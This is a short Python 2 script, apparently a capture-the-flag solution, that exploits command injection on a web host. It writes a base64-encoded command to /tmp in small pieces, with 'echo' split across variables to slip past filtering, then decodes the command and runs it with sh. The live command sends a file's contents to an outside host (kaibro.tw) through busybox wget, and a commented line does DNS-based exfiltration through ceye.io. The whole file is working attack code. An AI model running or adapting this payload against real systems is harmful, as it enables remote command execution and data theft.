import urllib
import urllib2
import time
import base64

base = "http://l4w.pw/%F0%9F%A4%94/?%E2%81%A3=`$_`;//;"

#cmd = "for i in $(busybox wget kaibro.tw) ; do host \"http://$i.8547wn.ceye.io\"; done"
cmd = "for i in $(cat /tmp/a | base64) ; do busybox wget \"http://kaibro.tw/?res=$i\"; done"
tmp = base64.b64encode(cmd)
print tmp

payload = []

# generate payload
cnt = 0
for i in range(len(tmp) / 4):
    if i == 0:
        s = "a=ec;b=ho;c=" + tmp[4*i:4*i+2]+";d="+tmp[4*i+2:4*i+4]+";$a$b%20$c$d>/tmp/q"
    else:
        s = "a=ec;b=ho;c=" + tmp[4*i:4*i+2]+";d="+tmp[4*i+2:4*i+4]+";$a$b%20$c$d>>/tmp/q"
    payload.append(s)
    print s

# base64 -d
payload.append("a=ba;b=se;c=64;$a$b$c%20-d%20/tmp/q>/tmp/v")

# sh
payload.append("sh%20/tmp/v")

# php
#payload.append("php%20/tmp/v")

for pay in payload:
    print base+pay
    content = urllib2.urlopen(base+pay).read()
    print content
    time.sleep(0.3)
